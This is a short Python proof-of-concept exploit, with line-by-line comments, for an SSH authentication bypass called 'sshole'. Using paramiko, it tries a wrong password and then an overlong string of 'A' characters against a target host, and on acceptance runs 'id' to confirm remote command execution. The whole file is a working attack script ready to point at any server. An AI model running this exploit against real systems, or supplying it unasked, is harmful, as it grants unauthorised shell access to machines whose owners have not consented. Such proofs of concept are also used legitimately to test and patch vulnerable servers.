#!/usr/bin/env python3
# Script *sshole PoC in paramiko (matches github.com/oz9un/sshole/poc/attack.py).
# usage: attack.py HOST PORT USER [LEN]
# one connection, two attempts: "wrong", then "A" * LEN (default 300).
# prints `id` on success.

# Defines the import statements for the script, including socket, sys, and paramiko modules.
import socket, sys, paramiko

# Defines the main function of the script, which takes command line arguments for host, port, user, and an optional length parameter.
host, port, user = sys.argv[1], int(sys.argv[2]), sys.argv[3]
n = int(sys.argv[4]) if len(sys.argv) > 4 else 300

# Creates a socket connection to the specified host and port, and starts a Paramiko transport client with a timeout of 10 seconds.
t = paramiko.Transport(socket.create_connection((host, port)))
t.start_client(timeout=10)

# Iterates through two password attempts: first with "wrong" and then with a string of "A" repeated n times. 
# It tries to authenticate with each password and prints whether the authentication was accepted or rejected. 
# If authentication is successful, it opens a session, executes the "id" command, and prints the result.
for pw in ("wrong", "A" * n):
    # Attempts to authenticate with the given username and password. If successful, it opens a session, executes the "id" command, 
    # and prints the result. If authentication fails, it prints a rejection message.
    try:
        t.auth_password(user, pw)
        print(f"password len={len(pw)}: ACCEPTED")
        c = t.open_session()
        c.exec_command("id")
        print("id ->", c.makefile().read().decode().strip())
        break
    # Catches the AuthenticationException if the password is rejected and prints a rejection message with the length of the password.
    except paramiko.AuthenticationException:
        print(f"password len={len(pw)}: rejected")
        
# Finally, the script closes the transport connection after the authentication attempts are complete.
t.close()
